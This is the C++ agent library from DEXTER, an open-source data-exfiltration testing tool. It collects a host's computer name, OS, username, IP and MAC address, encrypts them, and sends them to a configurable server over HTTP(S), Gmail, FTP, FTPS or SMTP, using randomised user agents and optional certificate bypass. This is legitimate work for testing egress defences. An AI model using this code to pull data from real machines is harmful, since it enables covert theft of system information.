//DEXTER - Data EXfiltration TestER
//This file is part of DEXTER Project

//Written by : @maldevel
//Website : https ://www.twelvesec.com/
//GIT : https://github.com/twelvesec/dexter

//TwelveSec(@Twelvesec)

//This program is free software : you can redistribute it and/or modify
//it under the terms of the GNU General Public License as published by
//the Free Software Foundation, either version 3 of the License, or
//(at your option) any later version.

//This program is distributed in the hope that it will be useful,
//but WITHOUT ANY WARRANTY; without even the implied warranty of
//MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.See the
//GNU General Public License for more details.

//You should have received a copy of the GNU General Public License
//along with this program.If not, see < http://www.gnu.org/licenses/>.

//For more see the file 'LICENSE' for copying permission.

#include "libagent.h"
#include "libhttp.h"
#include "libHash.h"
#include "rapidjson/document.h"
#include "helper.h"
#include "libsysteminfo.h"
#include "libcrypt.h"
#include "libencode.h"
#include "libcurl.h"
#include "libftp.h"

#include <iostream>

static std::wstring pick_random_useragent(std::set<std::wstring> uagents, std::wstring Protocol) {

	std::wstring useragent = helper::pick_random_useragent_fromfile(uagents);
	std::wcout << L"[" << Protocol << L"] " << L"User-Agent: " << useragent << std::endl;

	return useragent;
}

static std::string generate_data(std::string PoC_KEYWORD, std::string aespassword, std::wstring Protocol) {

	std::wcout << "[" << Protocol << "] " << "Collecting System Information" << std::endl;

	std::string computername = libsysteminfo::get_computer_name();
	std::string osversion = libsysteminfo::get_os_version();
	std::string username = libsysteminfo::get_username();
	std::string ipaddress = libsysteminfo::get_active_netface_ip();
	std::string macaddress = libsysteminfo::get_active_netface_mac();

	std::string uid = libHash::sha256("^" + computername + "." + osversion + "." + username + "$");

	if (computername == "" || osversion == "" || username == "" || uid == "" || ipaddress == "" || macaddress == "") {

		std::wcout << "[" << Protocol << "] " << "Collecting System Information failed" << std::endl;
	}

	std::string proto(Protocol.begin(), Protocol.end());

	std::string data = "protocol=" + proto + "&data=" + libcrypt::encrypt(aespassword, "UID=" + uid + "&ComputerName=" + computername +
		"&OS=" + osversion + "&Username=" + username +
		"&LocalIPAddress=" + ipaddress + "&PhysicalAddress=" + macaddress +
		"&PoCKEYWORD=" + PoC_KEYWORD + "&Protocol=" + proto);

	std::string tosearch = "+";
	std::string replace = "%2b";
	size_t pos = data.find(tosearch);
	while (pos != std::string::npos)
	{
		data.replace(pos, tosearch.size(), replace);
		pos = data.find(tosearch);
	}

	return data;
}

void libagent::test_http_protocol(std::wstring host, WORD port, std::wstring token_uri_method, std::wstring logclient_uri_method,
	std::wstring tokenuri,
	std::wstring logclienturi, std::set<std::wstring> uagents, WORD clientid, std::string secret, std::string username,
	std::string password, std::string aespassword, std::string PoC_KEYWORD, bool IGNORE_CERT_UNKNOWN_CA,
	bool IGNORE_CERT_DATE_INVALID, bool TLS_CONNECTION) {

	char *downloaded = 0;
	HINTERNET internet = NULL, connection = NULL, request = NULL;
	const WCHAR *token_headers = L"Accept: application/json\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: close\r\n";
	bool result = false;

	std::wstring protocol = (TLS_CONNECTION ? L"HTTPS" : L"HTTP");

	std::wstring useragent = pick_random_useragent(uagents, protocol);

	std::string token_data = "grant_type=password&client_id=" + std::to_string(clientid) + "&client_secret=" +
		secret + "&username=" + username + "&password=" + password + "&scope=*";

	std::wcout << L"[" << protocol << L"] " << L"Connecting to " << protocol << L" server" << std::endl;

	internet = libhttp::open(useragent);

	if (internet != NULL) {
		connection = libhttp::connect(internet, host, port);
	}

	if (!TLS_CONNECTION) {
		std::wcout << "[" << protocol << "] " << "Warning! Transmitting unencrypted data over " << protocol << std::endl;
	}

	std::wcout << L"[" << protocol << "] " << L"Requesting API token with " << protocol << L" packet" << std::endl;

	if (connection != NULL) {
		request = libhttp::json_request(connection, token_uri_method, tokenuri, (char*)token_data.c_str(), token_headers, IGNORE_CERT_UNKNOWN_CA,
			IGNORE_CERT_DATE_INVALID, TLS_CONNECTION);
	}

	if (request != NULL) {
		result = libhttp::retrieve_data(request, &downloaded);
	}

	if (result && downloaded != NULL) {

		rapidjson::Document token_response;
		token_response.Parse(downloaded);

		HeapFree(GetProcessHeap(), 0, downloaded);
		downloaded = NULL;

		std::wstring access_token = helper::read_string_value(&token_response, "access_token");
		std::wstring logclient_headers = L"Accept: application/json\r\nContent-Type: application/x-www-form-urlencoded\r\nAuthorization: Bearer " +
			access_token + L"\r\nConnection: close\r\n";

		std::string data = generate_data(PoC_KEYWORD, aespassword, protocol);

		std::wcout << L"[" << protocol << L"] " << L"Sending data with " << protocol << L" packet" << std::endl;

		if (connection != NULL) {
			request = libhttp::json_request(connection, logclient_uri_method, logclienturi, (char*)data.c_str(),
				logclient_headers.c_str(), IGNORE_CERT_UNKNOWN_CA, IGNORE_CERT_DATE_INVALID, TLS_CONNECTION);
		}

		data = "";

		if (request != NULL) {
			result = libhttp::retrieve_data(request, &downloaded);
		}

		if (result && downloaded != NULL) {
			rapidjson::Document logclient_response;
			logclient_response.Parse(downloaded);

			if (helper::read_bool_value(&logclient_response, "success") == true) {

				std::wcout << L"[" << protocol << L"] " << L"Transmission succeeded" << std::endl;
			}
			else {

				std::wcout << L"[" << protocol << L"] " << L"Transmission failed" << std::endl;
			}
		}

		if (downloaded) {
			HeapFree(GetProcessHeap(), 0, downloaded);
			downloaded = NULL;
		}

	}

	if (request) {
		InternetCloseHandle(request);
		request = NULL;
	}

	if (connection) {
		InternetCloseHandle(connection);
		connection = NULL;
	}

	if (internet) {
		InternetCloseHandle(internet);
		internet = NULL;
	}
}

void libagent::test_gmail_protocol(std::string gmail_smtp, std::string gmail_username, std::string gmail_password, std::string gmail_name,
	std::set<std::wstring> uagents, std::string aespassword, std::string PoC_KEYWORD) {

	libcurl::init();

	std::wstring useragent = pick_random_useragent(uagents, L"GMAIL");
	std::string encoded = generate_data(PoC_KEYWORD, aespassword, L"GMAIL");
	std::wcout << "[GMAIL] " << "Connecting to GMAIL SMTP server" << std::endl;
	std::wcout << "[GMAIL] " << "Sending data with GMAIL packet" << std::endl;
	std::string uagent(useragent.begin(), useragent.end());

	if (libcurl::send_email(gmail_username, gmail_password, gmail_smtp, gmail_name, PoC_KEYWORD, encoded, uagent, true, false)) {
		std::wcout << "[GMAIL] " << "Transmission succeeded" << std::endl;
	}
	else {
		std::wcout << "[GMAIL] " << "Transmission failed" << std::endl;
	}

	libcurl::finalize();
}

void libagent::test_ftp_protocol(std::wstring host, WORD port, std::wstring username, std::wstring password, std::set<std::wstring> uagents, std::string aespassword,
	std::wstring directory, std::string PoC_KEYWORD) {

	HINTERNET internet = NULL, connection = NULL;
	std::wstring protocol = L"FTP";
	std::wstring useragent = pick_random_useragent(uagents, protocol);
	std::wcout << L"[" << protocol << L"] " << L"Connecting to " << protocol << L" server" << std::endl;

	bool result = false;

	internet = libftp::open(useragent);

	if (internet != NULL) {
		connection = libftp::connect(internet, host, port, username, password);
	}

	std::wcout << "[" << protocol << "] " << "Warning! Transmitting unencrypted data over " << protocol << std::endl;

	std::wcout << L"[" << protocol << L"] " << L"Setting working directory" << std::endl;

	if (connection != NULL) {
		result = libftp::set_current_dir(connection, directory.c_str());
	}

	std::string data = "";

	if (result) {
		std::string data = generate_data(PoC_KEYWORD, aespassword, protocol);
		std::wcout << L"[" << protocol << L"] " << "Sending data with " << protocol << " packet" << std::endl;
		std::wcout << L"[" << protocol << L"] " << L"Writing file" << std::endl;
		std::wstring filename(PoC_KEYWORD.begin(), PoC_KEYWORD.end());
		result = libftp::write_file(connection, filename + L".txt", data);
	}

	if (result) {
		std::wcout << L"[" << protocol << L"] " << L"Transmission succeeded" << std::endl;
	}
	else {
		std::wcout << L"[" << protocol << L"] " << L"Transmission failed" << std::endl;
	}

	if (connection) {
		InternetCloseHandle(connection);
		connection = NULL;
	}

	if (internet) {
		InternetCloseHandle(internet);
		internet = NULL;
	}
}

void libagent::test_ftps_protocol(std::string host, WORD port, std::string username, std::string password, std::set<std::wstring> uagents, std::string aespassword,
	std::string directory, std::string PoC_KEYWORD, bool ignore_unknown_ca) {

	bool result = false;

	libcurl::init();

	std::wstring protocol = L"FTPS";
	std::wstring useragent = pick_random_useragent(uagents, protocol);
	std::wcout << L"[" << protocol << L"] " << L"Connecting to " << protocol << L" server" << std::endl;

	std::string uagent(useragent.begin(), useragent.end());
	std::wcout << L"[" << protocol << L"] " << L"Setting working directory" << std::endl;

	std::string data = generate_data(PoC_KEYWORD, aespassword, protocol);
	std::wcout << L"[" << protocol << L"] " << "Sending data with " << protocol << " packet" << std::endl;
	std::wcout << L"[" << protocol << L"] " << L"Writing file" << std::endl;

	libcurl::ftps_upload(directory, PoC_KEYWORD + ".txt", username, password, host, port, uagent, data, ignore_unknown_ca);

	if (result) {
		std::wcout << L"[" << protocol << L"] " << L"Transmission succeeded" << std::endl;
	}
	else {
		std::wcout << L"[" << protocol << L"] " << L"Transmission failed" << std::endl;
	}

	libcurl::finalize();
}

void libagent::test_smtp_protocol(std::string host, std::string username, std::string password, std::string name,
	std::set<std::wstring> uagents, std::string aespassword, std::string PoC_KEYWORD, bool OverTls, bool ignore_unknown_ca) {

	libcurl::init();
	std::wstring protocol = (OverTls ? L"SMTPS" : L"SMTP");

	std::wstring useragent = pick_random_useragent(uagents, protocol);
	std::string encoded = generate_data(PoC_KEYWORD, aespassword, protocol);
	std::wcout << "[" << protocol << "] " << "Connecting to " << protocol << " server" << std::endl;
	if (!OverTls) {
		std::wcout << "[" << protocol << "] " << "Warning! Transmitting unencrypted data over " << protocol << std::endl;
	}
	std::wcout << "[" << protocol << "] " << "Sending data with " << protocol << " packet" << std::endl;
	std::string uagent(useragent.begin(), useragent.end());

	if (libcurl::send_email(username, password, host, name, PoC_KEYWORD, encoded, uagent, OverTls, ignore_unknown_ca)) {
		std::wcout << "[" << protocol << "] " << "Transmission succeeded" << std::endl;
	}
	else {
		std::wcout << "[" << protocol << "] " << "Transmission failed" << std::endl;
	}

	libcurl::finalize();
}
